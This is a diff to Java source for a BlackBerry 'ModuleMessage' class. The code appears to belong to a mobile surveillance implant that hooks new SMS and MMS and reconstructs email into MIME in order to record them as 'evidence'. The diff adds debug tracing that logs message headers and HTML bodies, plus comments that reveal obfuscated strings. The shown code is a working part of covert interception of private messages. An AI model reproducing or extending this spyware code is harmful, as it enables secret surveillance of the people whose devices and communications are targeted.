@@ -10,6 +10,7 @@
 package blackberry.module;
 
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Vector;
@@ -420,7 +421,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (date == null) {
             date = new Date(0);
-            markupDate.put(key, date, true);
+            //markupDate.put(key, date, true);
         }
         return date;
     }
@@ -522,7 +523,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
 
             // Creating log
-            createEvidence(additionalData, WChar.getBytes( message),
+            createEvidence(additionalData, WChar.getBytes(message),
                     EvidenceType.SMS_NEW);
 
         } catch (final Exception ex) {
@@ -536,7 +537,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     public boolean onNewMms(final byte[] byteMessage, String address,
             final boolean incoming) {
-        
+
         if (byteMessage == null) {
             return false;
         }
@@ -688,7 +689,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
             databuffer.writeLong(filetime.getFiledate());
-            
+
             //#ifdef DBC
             Check.asserts(additionalData.length == 20,
                     "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
@@ -736,11 +737,14 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //#endif
 
         // comincia la ricostruzione del MIME
+        //18.14=MIME-Version: 1.0
         mailRaw.append(Messages.getString("18.14") + "\r\n"); //$NON-NLS-1$
         final long rnd = Math.abs(Utils.randomLong());
+        //18.15=------_NextPart_
         final String boundary = Messages.getString("18.15") + rnd; //$NON-NLS-1$
 
         if (mail.isMultipart()) {
+            //18.16=Content-Type: multipart/alternative; boundary=
             mailRaw.append(Messages.getString("18.16") //$NON-NLS-1$
                     + boundary + "\r\n"); //$NON-NLS-1$
             mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -760,6 +764,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mail.hasHtml()) {
+            //#ifdef DEBUG
+            try {
+                debug.trace("makeMimeMessage, hasHtml: "
+                        + mail.htmlMessageContentType + " "
+                        + Utils.byteArrayToHex(mail.htmlMessage.getBytes("UTF-8")));
+                debug.trace("makeMimeMessage, html: " + mail.htmlMessage);
+            } catch (UnsupportedEncodingException e) {
+                // TODO Auto-generated catch block
+                e.printStackTrace();
+            }
+            //#endif
             //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
             //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
             mailRaw.append(mail.htmlMessageContentType);
@@ -772,6 +787,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
         if (mail.isEmpty()) {
+            //#ifdef DEBUG
+            debug.trace("makeMimeMessage, mail empty");
+            //#endif
+            // 18.17=Content-type: text/plain; charset=UTF8
             mailRaw.append(Messages.getString("18.17") + "\r\n\r\n"); //$NON-NLS-1$
 
             String msg = message.getBodyText();
@@ -782,9 +801,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         mailRaw.append("\r\n"); //$NON-NLS-1$
-
+       
         final String craftedMail = mailRaw.toString();
-
         return craftedMail;
     }
 
@@ -805,6 +823,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 mail.append(header.getName());
                 mail.append(header.getValue());
                 mail.append("\r\n"); //$NON-NLS-1$
+                //#ifdef DEBUG
+                debug.trace("addAllHeaders "+ header.getName() + " = " + header.getValue());
+                //#endif
             } else {
                 //#ifdef DEBUG
                 debug.error("Unknown header type: " + headerObj); //$NON-NLS-1$
@@ -831,6 +852,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 final Header header = (Header) headerObj;
                 if (header.getName().startsWith(Messages.getString("18.18"))) { //$NON-NLS-1$
                     fromFound = true;
+                    //#ifdef DEBUG
+                    debug.trace("addFromHeaders, from found");
+                    //#endif
                 }
             }
         }
